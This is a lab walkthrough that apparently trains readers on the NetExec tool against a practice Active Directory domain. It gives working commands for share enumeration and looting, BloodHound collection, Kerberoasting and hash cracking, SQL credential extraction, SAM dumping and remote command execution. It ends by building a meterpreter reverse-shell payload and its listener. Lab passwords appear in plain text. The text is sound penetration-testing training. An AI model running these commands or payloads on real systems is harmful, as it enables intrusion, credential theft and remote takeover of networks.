# 💃 NetExec Training Lab

Here is my infrastructure for this lab:

<figure><img src="../.gitbook/assets/image (1219).png" alt=""><figcaption></figcaption></figure>

I start by creating a host file with all my possible targets:

<figure><img src="../.gitbook/assets/image (1220).png" alt=""><figcaption></figcaption></figure>

We can confirm the hosts are up with the following command:

<figure><img src="../.gitbook/assets/image (1221).png" alt=""><figcaption><p>nxc smb host.txt</p></figcaption></figure>

Here we have a list of all our targets but if we wanted to discover hosts from scratch we could've done the following command:

```
nxc smb 10.1.0.0/16
```

It's long so i did not do it all but here is what it looks like:

<figure><img src="../.gitbook/assets/image (1222).png" alt=""><figcaption></figcaption></figure>

First i'll try to enumerate without any credentials:

```
nxc smb ./hosts.txt -u '' -p '' --shares
#did not work
```

Now i'll go and try to get some shares with the guest user:

```
nxc smb host.txt -u 'Guest' -p '' --shares
```

Obviously i'll enumerate all the shares at once so we can win some time:

<figure><img src="../.gitbook/assets/image (1223).png" alt=""><figcaption></figcaption></figure>

Here i'd try and get the files with smbclient but since this is a nxc lab i'll stay in scope

(here is the smbclient command i would've used:)

```
smbclient \\\\10.1.99.248\\Secret
```

Funny enough the anonymous user can also enumerate the shares:

<figure><img src="../.gitbook/assets/image (1224).png" alt=""><figcaption></figcaption></figure>

Then i saw that whatever user even if he does not exist can enumerate :joy:

<figure><img src="../.gitbook/assets/image (1225).png" alt=""><figcaption></figcaption></figure>

<figure><img src="../.gitbook/assets/image (1226).png" alt=""><figcaption></figcaption></figure>

To enumerate the shares we can do it many ways but we are going to keep it simple ->

```
nxc smb 10.1.99.248 -u 'guest' -p '' -M spider_plus -o DOWNLOAD_FLAG=true
```

<figure><img src="../.gitbook/assets/image (1227).png" alt=""><figcaption></figcaption></figure>

We see the folder where out output is stored but since we don't have access to the files we can't access anything:

<figure><img src="../.gitbook/assets/image (1228).png" alt=""><figcaption></figcaption></figure>

Obviously we can spray a bit more on a whole list of targets with our host file:

```
nxc smb ./host.txt -u 'guest' -p '' -M spider_plus -o DOWNLOAD_FLAG=True
```

Now we are going to try and find some users that may have some more privileges to read shares ->

So first we are going to try some null credentials ->

```
nxc smb host.txt -u '' -p '' --users
```

<figure><img src="../.gitbook/assets/image (1229).png" alt=""><figcaption><p>John Hammond (Password : plzsubscribe)</p></figcaption></figure>

We can see a user with a set of credentials, bingo :tada:

SO now it's going to be real easy to enumerate the shares:

```
nxc smb host.txt -u johnh -p "plzsubscribe" --shares
```

<figure><img src="../.gitbook/assets/image (1230).png" alt=""><figcaption></figcaption></figure>

So we can see that we can access way more shares, let's download everything:



<figure><img src="../.gitbook/assets/image (1231).png" alt=""><figcaption></figcaption></figure>

```
nxc smb host.txt -u johnh -p "plzsubscribe" -M spider_plus -o DOWNLOAD_FLAG=true
```

While checking the spiderplus folder we can see more then 1 file;

<figure><img src="../.gitbook/assets/image (1232).png" alt=""><figcaption></figcaption></figure>

in the first folder we can go very deep, we'll check that out later:

<figure><img src="../.gitbook/assets/image (1233).png" alt=""><figcaption></figcaption></figure>

And in the other file we got the Share named Secret from earlier with an interesting note:

<figure><img src="../.gitbook/assets/image (1234).png" alt=""><figcaption></figcaption></figure>

```
Remember to unmount the secret share!
```

Another good thing to do is validate the credentials and check on which host they work:

```
nxc smb host.txt -u johnh -p "plzsubscribe"
```

<figure><img src="../.gitbook/assets/image (1235).png" alt=""><figcaption></figcaption></figure>

> If you see a green 🟩 plus sign ➕ on the output lines where it lists the hosts, this means the authentication worked!
>
> ❗**Note, this only validates access over SMB, as that was our chosen protocol. This alone does not mean that other forms of access like the remote desktop protocol or others would work just as well.**

Now we are going to play around with bloodhound:

```
http://localhost:8080
Email: bloodhound-admin
Password: bloodhound-password
```

First we can log in through the web interface, but we quickly see that there is no data imported:

<figure><img src="../.gitbook/assets/image (1236).png" alt=""><figcaption></figcaption></figure>

Next, we need to retrieve the information that [**Bloodhound**](https://github.com/SpecterOps/BloodHound) can work with. Traditionally we would use something like `SharpHound` or other tools and do that semi-manually, but [**`NetExec`**](https://www.netexec.wiki/) makes this even easier for us! ➡️

```
nxc ldap 10.1.4.55 -u johnh -p "plzsubscribe" --bloodhound --collection All
```

<figure><img src="../.gitbook/assets/image (1237).png" alt=""><figcaption></figcaption></figure>

This will create a ZIP file, but we are more interested in the JSON files that are created in our current directory.

If you return the [**Bloodhound**](https://github.com/SpecterOps/BloodHound) user interface within Firefox, you can click to go to the **File Ingest** page and then upload files.

1. ⬆️ Click the button to upload the data
2. 📂 Navigate in the file explorer to the location of your new JSON files
3. ⌨️ Hold **Shift** to click and select all of the JSON files created by NetExec.
4. 🖱️ Click **Upload**.
5. ✅ Confirm these are the files that you would like, and click **Upload** once more.

<figure><img src="../.gitbook/assets/image (1238).png" alt=""><figcaption></figcaption></figure>

<figure><img src="../.gitbook/assets/image (1239).png" alt=""><figcaption></figcaption></figure>

Then we can go in the explore page to start and look at everything:

<figure><img src="../.gitbook/assets/image (1240).png" alt=""><figcaption></figcaption></figure>

You can Search for any object, like `DOMAIN COMPUTERS@NETEXEC.LAB`, and explore its properties, and explore what has relationships with what across the environment.

What we can do is toggle the search on the left-hind side to **Cypher**. This allows you to enter a totally custom search query in syntax, but we can click the 📂 folder icon to see some already suggested and provided queries.

Scrolling down the list, one entry might be especially useful for us:

```
All Kerberoastable Users
```

<figure><img src="../.gitbook/assets/image (1241).png" alt=""><figcaption></figcaption></figure>

so now we got our initial attack path:

```
nxc ldap 10.1.5.44 -u johnh -p "plzsubscribe" --kerberoast ./kerberoast.txt
```

<figure><img src="../.gitbook/assets/image (1242).png" alt=""><figcaption></figcaption></figure>

To go even quicker we even specified the output file so we can start cracking the hash offline ->

<figure><img src="../.gitbook/assets/image (1243).png" alt=""><figcaption></figcaption></figure>

Let's use john to crack all of this:

```
john --format=krb5tgs --wordlist=/usr/share/wordlists/seclists/Passwords/Common-Credentials/10k-most-common.txt kerberoast.txt
```

<figure><img src="../.gitbook/assets/image (1244).png" alt=""><figcaption><p>letmein</p></figcaption></figure>

So we got our password, since this is an sql user we can assume that mssql is running, let's check:

```
nxc mssql host.txt -u sqlsvc -p 'letme1n'    
```

<figure><img src="../.gitbook/assets/image (1245).png" alt=""><figcaption></figcaption></figure>

So now let's try accessing the database ->

```
impacket-mssqlclient netexec.lab/sqlsvc:letme1n@10.1.195.209 -windows-auth
```

<figure><img src="../.gitbook/assets/image (1246).png" alt=""><figcaption></figcaption></figure>

so if we don't know what to do we can use the famous help command ->

<figure><img src="../.gitbook/assets/image (1247).png" alt=""><figcaption></figcaption></figure>

We are going to start by enumerating the database with the&#x20;

```sql
enum_db
```

command ->

<figure><img src="../.gitbook/assets/image (1248).png" alt=""><figcaption></figcaption></figure>

Ok so i think we can guess where we have to go next ->

```
use users        
#now let's list the different columns ->
SELECT name FROM sys.tables
SELECT * FROM credentials
```

<figure><img src="../.gitbook/assets/image (1249).png" alt=""><figcaption></figcaption></figure>

```
username       password                
------------   ---------------------   
b'benjaminm'   b'w5gzI6&xx%aBqZC^GZ'
```

So now that we got a new domain user, let's go back to bloodhound and add the freshly compromised user to owned:

<figure><img src="../.gitbook/assets/image (1250).png" alt=""><figcaption><p>already clicked on owned</p></figcaption></figure>

And we can go and look to see who is this user in the domain in the 'Member Of' section:

<figure><img src="../.gitbook/assets/image (1251).png" alt=""><figcaption></figcaption></figure>

The FSADMIN group is very interesting&#x20;

let's take the credentials and try to see where we get some action ->

```
nxc smb 10.1.99.248 -u "benjaminm" -p "w5gzI6&xx%aBqZC^GZ"
```

<figure><img src="../.gitbook/assets/image (1253).png" alt=""><figcaption></figcaption></figure>

the **`(Pwned!)`** message on the line for the host means this account is a local administrator on the file server! bingo, that means we can get remote code execution ->

```
nxc smb 10.1.99.248 -u "benjaminm" -p "w5gzI6&xx%aBqZC^GZ" -X 'net localgroup Administrators'
```

<figure><img src="../.gitbook/assets/image (1254).png" alt=""><figcaption></figcaption></figure>

So nothing stops us from using other sweet tooling from [**`NetExec`**](https://www.netexec.wiki/). We can even easily dump the SAM database to find more hashes to crack!

```
nxc smb 10.1.99.248 -u "benjaminm" -p "w5gzI6&xx%aBqZC^GZ" --sam
```

<figure><img src="../.gitbook/assets/image (1255).png" alt=""><figcaption></figcaption></figure>

Another good thing to know is that it is even capable to look for logged in users ->

<figure><img src="../.gitbook/assets/image (1256).png" alt=""><figcaption></figcaption></figure>

We can see one new domain user that actually comes from a **`logon_server: DC01`**

Now our goal will be to impersonate an admin ->

[**`NetExec`**](https://www.netexec.wiki/) gets clever, and can actualy use scheduled tasks to immediately invoke a command as any logged in user that we would like

```
nxc smb 10.1.99.248 -u "benjaminm" -p "w5gzI6&xx%aBqZC^GZ" -M schtask_as -o USER=johna CMD=whoami
```

<figure><img src="../.gitbook/assets/image (1257).png" alt=""><figcaption><p>this is actually crazy</p></figcaption></figure>

Now the move would be to get a reverse shell, let's craft a payload with msfvenom ->

```
msfvenom -p windows/x64/meterpreter_reverse_tcp LHOST=10.1.241.175 LPORT=4444 -f exe -o payload.exe
```

<figure><img src="../.gitbook/assets/image (1258).png" alt=""><figcaption></figcaption></figure>

Now let's open a new tab, run msfconsole and set up a listener:

```
use multi/handler

set payload windows/x64/meterpreter_reverse_tcp
set LHOST 0.0.0.0
set ExitOnSession false
set LPORT 4444

run #listener is up and running
```

<figure><img src="../.gitbook/assets/image (1259).png" alt=""><figcaption></figcaption></figure>

Next, we need to get our `payload.exe` on the target file server host!

Let's first split our terminal again and set up a python server to host our payload:

<figure><img src="../.gitbook/assets/image (1260).png" alt=""><figcaption></figcaption></figure>
